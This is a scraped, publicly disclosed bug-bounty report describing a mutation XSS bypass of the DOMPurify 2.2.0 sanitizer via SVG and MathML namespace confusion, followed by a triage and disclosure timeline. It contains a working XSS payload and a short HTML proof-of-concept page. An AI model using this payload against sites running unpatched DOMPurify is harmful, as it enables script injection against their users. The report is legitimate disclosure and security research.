---
title: DOMPurify bypass (SVG mutation XSS, Report #1024734)
author: vovohelo
url: https://hackerone.com/reports/1024734
date_published: 2020-11-02 (disclosed 2020-12-17)
date_scraped: 2026-11-16
platform: hackerone
disclosed_report: https://hackerone.com/reports/1024734
bounty: not eligible (Internet Bug Bounty declined; scope is core internet infrastructure)
vuln_class: xss
---

<!-- Raw scraped text below. Public, non-paywalled content only.
     This file is source material, never copied into skills verbatim. -->

Reported to: Internet Bug Bounty. Reported by: vovohelo. Reported on: November 2, 2020, 7:06pm UTC. Status: Resolved. Severity: Medium (5.4). Weakness: Cross-site Scripting (XSS) - Generic. Disclosed: December 17, 2020.

## Report body

A mutation based bypass exists in DOMPurify when sanitizing svg elements using almost the same technique described by Michal Bentkowski (@SecurityMB) at https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/.

A PoC payload with the DOM state before and after parsing is available at https://livedom.lab.xss.academy/ (URL-encoded input: `<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>">`, parser: "DOMPurify Latest").

The following is a PoC html document that uses DOMPurify's latest version available at https://github.com/cure53/DOMPurify/releases/tag/2.2.0

Code (630 Bytes). Note: the scraper stripped whitespace; line structure restored below. The JS string escaping in the scrape appeared doubled (`\\'XSS\\'`); the intended source is `\'XSS\'`.

```html
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html lang="en">

<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<script src="./purify.js"></script>
<title>DOMPurify bypass</title>
</head>

<body>
<script>
const html='<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(\'XSS\') src>">';
const sanitized = DOMPurify.sanitize(html);
let div = document.createElement('div');
 div.innerHTML = sanitized;
</script>
</body>

</html>
```

The issue was already reported to the DOMPurify's team at https://github.com/cure53/DOMPurify/issues/482

## Impact

Websites using DOMPurify with its default configuration are vulnerable to XSS.

## Timeline

- Nov 2, 2020, 7:06pm UTC: vovohelo submitted the report to Internet Bug Bounty.
- Nov 3, 2020, 12:59am UTC: vovohelo comment: a patch was released for the mXSS bypass reported here https://github.com/cure53/DOMPurify/releases/tag/2.2.2
- Nov 3, 2020, 11:27am UTC: 0xcain changed status to Needs more info. Asked whether vovohelo holds the GitHub account `bananabr` and to create a repository containing the HackerOne handle `vovohelo` for verification.
- Nov 3, 2020, 1:41pm UTC: vovohelo changed status to New: "Here you go @0xcain https://github.com/bananabr/vovohelo"
- Nov 4, 2020, 11:56am UTC: 0xcain updated severity from medium to medium (5.4).
- Nov 4, 2020, 12:03pm UTC: 0xcain changed status to Triaged ("We were able to validate your report, and have submitted it to the appropriate remediation team for review.") and then closed the report as Resolved.
- Nov 17, 2020, 4:43am UTC: vovohelo requested disclosure: "I already reported the vulnerability in my blog https://vovohelo.medium.com/from-svg-and-back-yet-another-mutation-xss-via-namespace-confusion-for-dompurify-2-2-2-bypass-5d9ae8b1878f, so there is no reason to keep this private."
- Dec 17, 2020, 4:43am UTC: report disclosed.
- Jul 23, 2021: reed (IBB): "This bounty program is intended for vulnerabilities that exist in core internet infrastructure and protocols. Sorry, but we're not able to accept vulnerability reports on behalf of arbitrary products. Potential issues that only impact a single vendor should be disclosed directly to the appropriate vendor." IBB decided the report is not eligible for a bounty.

## Metadata

Report Id #1024734. Participants: vovohelo, reed, 0xcain. CVE ID: None. Bounty: Hidden/not eligible.
